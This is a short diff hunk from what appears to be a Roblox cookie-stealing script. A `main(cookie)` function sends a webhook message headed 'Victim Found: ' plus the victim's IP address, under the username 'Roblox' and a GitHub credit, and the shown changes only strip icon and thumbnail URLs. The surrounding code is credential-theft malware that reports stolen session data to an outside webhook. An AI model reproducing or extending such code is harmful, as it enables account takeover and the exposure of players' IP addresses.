@@ -42,19 +42,13 @@ async function main(cookie) {
                 ],
                 "author": {
                   "name": "Victim Found: " + ipAddr,
-                  "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                 },
                 "footer": {
                   "text": "https://github.com/ox-y",
-                  "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
-                },
-                "thumbnail": {
-                  "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                 }
               }
             ],
             "username": "Roblox",
-            "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
             "attachments": []
         })
     });
